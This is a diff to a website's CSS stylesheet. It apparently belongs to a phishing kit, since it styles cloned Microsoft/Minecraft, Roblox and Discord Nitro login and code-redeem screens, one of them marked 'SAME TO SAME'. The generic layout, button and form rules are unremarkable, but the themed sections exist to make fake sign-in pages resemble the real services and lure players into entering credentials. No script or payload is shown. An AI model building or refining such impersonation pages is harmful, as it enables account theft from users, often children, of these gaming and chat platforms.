@@ -89,23 +89,62 @@ nav{position:sticky;top:0;z-index:900;height:var(--nh);display:flex;align-items:
 .nav-right{display:flex;align-items:center;gap:8px}
 .theme-btn{width:36px;height:36px;border-radius:50%;background:var(--pd);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;transition:all 0.22s}
 .theme-btn:hover{background:var(--border);transform:scale(1.1)}
-.btn-discord{display:flex;align-items:center;gap:7px;background:linear-gradient(135deg,var(--p),#5b35e8);border:none;border-radius:100px;padding:9px 18px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;transition:all 0.22s;box-shadow:0 4px 14px rgba(124,92,252,0.35)}
 
-/* ════════════════ MINECRAFT ════════════════ */
+/* ── LAYOUT ── */
+.wrap{max-width:1280px;margin:0 auto;padding:0 20px 100px;position:relative;z-index:1}
+.wrap-sm{max-width:640px;margin:0 auto;padding:0 20px 100px;position:relative;z-index:1}
+.wrap-md{max-width:980px;margin:0 auto;padding:0 20px 100px;position:relative;z-index:1}
+.page-body{animation:pageIn 0.4s cubic-bezier(0.22,1,0.36,1) both}
+
+/* ── CARD ── */
+.card{background:var(--card-bg,var(--surface));border:1px solid var(--border);border-radius:var(--r3);padding:28px;margin-bottom:14px;position:relative;overflow:hidden;transition:all 0.3s cubic-bezier(0.22,1,0.36,1);box-shadow:var(--s1)}
+.card:hover{border-color:var(--border2);transform:translateY(-3px);box-shadow:var(--s3)}
+.card-line{position:absolute;top:0;left:0;right:0;height:2.5px;border-radius:var(--r3) var(--r3) 0 0}
+.card h3{font-family:'Fraunces',serif;font-size:18px;font-weight:600;margin-bottom:8px;color:var(--t)}
+.card>p{font-size:14px;color:var(--t2);line-height:1.75;margin-bottom:22px}
+
+/* ── BUTTONS ── */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border:none;border-radius:100px;padding:13px 28px;font-family:'DM Sans',sans-serif;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.22s cubic-bezier(0.22,1,0.36,1);white-space:nowrap}
+.btn-primary{background:linear-gradient(135deg,var(--p),#5b35e8);color:#fff;box-shadow:0 4px 18px rgba(124,92,252,0.38)}
+.btn-ghost{background:rgba(124,92,252,0.06);color:var(--t2);border:1px solid var(--border)}
+
+/* ── FORM ── */
+.field{margin-bottom:16px}
+.field label{display:block;font-size:11px;font-weight:700;color:var(--t2);margin-bottom:7px;text-transform:uppercase;letter-spacing:0.07em}
+.inp{width:100%;padding:12px 15px;background:var(--input-bg);border:1.5px solid var(--border);border-radius:var(--r2);font-family:'DM Sans',sans-serif;font-size:14px;color:var(--t);outline:none;transition:all 0.2s}
+.inp:focus{border-color:var(--p);background:var(--surface)}
+
+/* ── NOTICES ── */
+.notice{padding:13px 16px;border-radius:var(--r2);margin-bottom:16px}
+.notice .nt{font-size:11px;font-weight:700;margin-bottom:4px;text-transform:uppercase;letter-spacing:0.07em}
+.notice.nw{background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);color:#92400e}.notice.nw .nt{color:#b45309}
+
+/* ── TOAST ── */
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;align-items:center;gap:10px;background:var(--t);color:var(--bg);border-radius:100px;padding:12px 22px;font-size:14px;font-weight:500;box-shadow:0 8px 32px rgba(0,0,0,0.18);opacity:0;pointer-events:none;z-index:9999;transition:opacity 0.15s}
+#toast.show{opacity:1;animation:toastIn 0.3s cubic-bezier(0.22,1,0.36,1)}
+
+/* ── SUCCESS CARD ── */
+.scard{background:var(--surface);border:1px solid var(--border);border-radius:var(--r3);padding:40px 28px;text-align:center;display:none;box-shadow:var(--s2)}
+.scard.show{display:block;animation:fadeUp 0.4s cubic-bezier(0.22,1,0.36,1)}
+.sico{width:68px;height:68px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto 18px}
+.stitle{font-family:'Fraunces',serif;font-size:24px;font-weight:600;margin-bottom:10px;color:var(--t)}
+.timrow{display:inline-flex;align-items:center;gap:8px;background:var(--pd);border:1px solid var(--border);border-radius:100px;padding:7px 16px;font-size:13px;color:var(--p);font-weight:600}
+
+/* ── MINECRAFT & XBOX OVERHAUL THEME ── */
 .mc-theme-bg{position:fixed;inset:0;z-index:0;background-image: url('https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/key-art/Minecraft-Redeem-Code-Banner.jpg');background-size:cover;background-position:center;filter:brightness(0.5);display:none}
 .mc-theme-bg.show{display:block}
-.mc-pro-container{position:relative;z-index:10;width:100%;display:none;flex-direction:column;align-items:center}
+.mc-pro-container{position:relative;z-index:10;width:100%;max-width:none;display:none;flex-direction:column;align-items:center}
 .mc-login-box {background:#fff;padding:44px;width:100%;max-width:440px;box-shadow:0 20px 60px rgba(0,0,0,0.4);margin:40px auto;border-radius:4px;text-align:left;font-family:'Segoe UI',Tahoma,sans-serif}
 .mc-login-inp {width:100%;border:none;border-bottom:1px solid #666;padding:10px 0;font-size:16px;outline:none;margin-top:10px;color:#1b1b1b}
 .mc-login-inp:focus {border-bottom-color:#0067b8;border-bottom-width:2px}
 .mc-btn-next {background:#0067b8;color:#fff;border:none;padding:10px 36px;font-size:15px;cursor:pointer;min-width:108px;font-weight:600}
 .mc-redeem-hero {width:100%;max-width:1000px;margin:60px auto;padding:80px 40px;text-align:center;background:rgba(0,0,0,0.6);backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,0.1);border-radius:4px}
 .mc-redeem-title {font-family:'DM Sans',sans-serif;font-size:clamp(32px,5vw,48px);font-weight:800;color:#fff;margin-bottom:40px;text-transform:uppercase;letter-spacing:2px}
-.mc-code-input-container {background:#fff;padding:15px;border-radius:4px;margin-bottom:30px}
+.mc-code-input-container {background:#fff;padding:15px;border-radius:4px;margin-bottom:30px;box-shadow:0 4px 15px rgba(0,0,0,0.3)}
 .mc-code-inp {width:100%;background:transparent;border:none;color:#1a1a1a;font-family:monospace;font-size:24px;text-align:center;outline:none;letter-spacing:4px}
 .mc-btn-redeem {background:#10b981;color:#fff;border:none;padding:18px 60px;font-weight:800;font-size:20px;cursor:pointer;border-radius:4px;box-shadow:0 4px 0 #0d9668}
 
-/* ════════════════ ROBLOX ════════════════ */
+/* ── ROBLOX REDESIGN ── */
 .rb-theme-wrapper {background:#f2f4f5;min-height:100vh;width:100%;font-family:'HCo Gotham SSm','Segoe UI',sans-serif;display:none;flex-direction:column}
 .rb-topbar {background:#fff;height:60px;display:flex;align-items:center;padding:0 20px;border-bottom:1px solid #e3e3e3;gap:20px;position:sticky;top:0;z-index:1000}
 .rb-logo {height:28px;cursor:pointer}
@@ -119,7 +158,7 @@ nav{position:sticky;top:0;z-index:900;height:var(--nh);display:flex;align-items:
 .rb-login-wrapper {background:#f2f4f5;min-height:100vh;display:none;align-items:center;justify-content:center;padding:20px}
 .rb-login-card {background:#fff;padding:40px;width:100%;max-width:440px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,0.1);border-radius:8px}
 
-/* ════════════════ DISCORD NITRO (SAME TO SAME) ════════════════ */
+/* ── DISCORD NITRO (SAME TO SAME) ── */
 .dc-login-wrapper {
   background: #5865f2;
   background-image: radial-gradient(circle at 0% 0%, rgba(88,101,242,0.5) 0%, transparent 50%),
@@ -172,4 +211,11 @@ nav{position:sticky;top:0;z-index:900;height:var(--nh);display:flex;align-items:
 .dc-close-btn { position: absolute; top: 40px; right: 40px; width: 40px; height: 40px; border-radius: 50%; border: 2px solid #949ba4; display: flex; align-items: center; justify-content: center; color: #949ba4; cursor: pointer; font-weight: 700; }
 .dc-close-btn::after { content: 'ESC'; position: absolute; bottom: -22px; font-size: 10px; }
 
-@media(max-width: 768px) { .dc-sidebar { display: none; } .dc-content { padding: 40px 20px; } .dc-login-card { flex-direction: column; gap: 30px; } .dc-login-right { width: 100%; } }
+/* ── MOBILE FIXES ── */
+@media(max-width:768px){
+  nav{padding:0 12px}
+  .nav-tabs{display:none}
+  .dc-login-card{flex-direction:column;gap:30px}
+  .dc-login-right{width:100%}
+  .dc-sidebar{display:none}
+}
